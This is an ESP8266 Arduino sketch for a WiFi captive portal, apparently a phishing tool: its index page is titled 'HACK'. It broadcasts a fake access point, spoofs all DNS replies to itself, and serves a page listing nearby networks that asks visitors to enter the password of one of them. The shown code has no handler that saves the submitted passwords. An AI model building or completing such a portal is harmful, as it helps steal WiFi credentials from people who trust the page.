/* 
    ESP8266 WiFi Captive Portal
    https://github.com/adamff1/ESP8266-Captive-Portal

    Cyclenerd/AccessPoint.ino
    https://gist.github.com/Cyclenerd/7c9cba13360ec1ec9d2ea36e50c7ff77

    A LITTLE KOREAN?
    https://yonglimlee.tistory.com/entry/nodeMCU-%EC%99%80%EC%9D%B4%ED%8C%8C%EC%9D%B4-%EC%8A%A4%EC%BA%94%ED%95%B4%EC%84%9C-AP%EC%9D%B4%EB%A6%84%EA%B3%BC-%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8-%EC%95%8C%EC%95%84%EC%98%A4%EA%B8%B0
*/

#include <ESP8266WiFi.h>

#include <DNSServer.h>
#include <ESP8266WebServer.h>

#include "ESP8266TimerInterrupt.h"             //https://github.com/khoih-prog/ESP8266TimerInterrupt

IPAddress APIP(172, 0, 0, 1); // Gateway
const byte DNS_PORT = 53;
const byte HTTP_CODE = 200;

DNSServer dnsServer;
ESP8266WebServer webServer(80);





String html;

String htmlIndex = R"(
<!doctype html>
<html>
<head>
	<title>HACK</title>
</head>
<body>
	<h1>This is HACK</h1>
</body>
</html>
)";

int scanWiFiList() { return WiFi.scanNetworks(); }
String htmlSelectWifiList()
{
    String result = String(
R"(
<!DOCTYPE HTML>
<html>
<head>
    <meta http-equiv="Content-Type" Content="text/html; charset=utf-8">
    <meta name='viewport' content='width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no'>
    <title>WIFI 목록</title>
    <style>
    .a:hover{cursor:pointer;}
    </style>
</head>
<body>
    <h1>WiFi List</h1>
    인증가능한 WiFi를 선택하세요. <br>
    <div id='wifiList'>
    #{strWiFiList}
    </div>
    <div id='selected'></div>
    <div id='_pw'>
    <form method='get' action='/action_page'>
    <input type='text' id='ap' name='apName'> 을 선택하셨습니다. 아래에 비밀번호를 입력하세요. <br>
    <input type='password' id='pw' name='apPw'> <input type='submit' value='connect'>
    </form>
    </div>
</body>
<script>
    document.getElementById('_pw').style.visibility = 'hidden';
    function select(apName){
    document.getElementById('ap').value = apName;
    document.getElementById('_pw').style.visibility = 'visible';
    document.getElementById('pw').value = ''}
    function connection(){ 
    var pw = document.getElementById('pw').value;
    }
</script>
</html>
)" 
    );


    // MAKE strWiFiList
    Serial.println("WIFI SCANNING START...");
    String strWiFiList ="";
    {
        std::vector<String> networkList;

        strWiFiList += "<ul>";
        for(int i=0; i<scanWiFiList(); i++)
        {
            String ssid = WiFi.SSID(i);

            //add SSID when NOT DUPLICATED
            if (std::find(networkList.begin(), networkList.end(), ssid) == networkList.end()) {
                networkList.push_back(ssid);

                if(ssid != "")
                    strWiFiList += "<li><a name='" + ssid + "' onclick='select(this.name)'>" + ssid + "</a> </li>";
            }
        }
        strWiFiList += "</ul>";
    }
    Serial.println("WIFI SCANNING END!");

    // INSERT strWiFiList
    result.replace("#{strWiFiList}", strWiFiList);


    //String apName = "";
    //String apPw = "";


    return result;
}









ESP8266Timer TimerInterrupt;

void setup()
{
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);

    // Serial begin
    Serial.begin(115200);
    Serial.println("\nSERIAL IS ONLINE\n");





    // Wifi settings
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP( F("I AM NOT WIFI") );

    // DNS spoofing (Only for HTTP)
    // if DNSServer is started with "*" for domain name, it will reply with
    // provided IP to all DNS request
    dnsServer.start(DNS_PORT, "*", APIP);

    // WebServer requests
    // webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
    // webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
    // webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
    // webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
    // webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });

    html = htmlSelectWifiList();
    webServer.onNotFound( [&] { webServer.send(HTTP_CODE, "text/html", html); } );
    webServer.begin();

    Serial.println("\n");
    Serial.println("SERVER STARTED!!");
    Serial.println("TimerInterrupt START!!");

    TimerInterrupt.attachInterruptInterval  (1000,  [] 
                                                    {
                                                        //per1ms!
                                                        {
                                                            
                                                        }

                                                        //per500ms!
                                                        if( !(millis()%500) )
                                                        {
                                                            static bool stateLED = false;
                                                            digitalWrite(LED_BUILTIN, stateLED^=1 ? HIGH : LOW);
                                                        }
                                                    }
                                            );
}

void loop()
{
    delay(1);
    
    dnsServer.processNextRequest();
    webServer.handleClient();
}
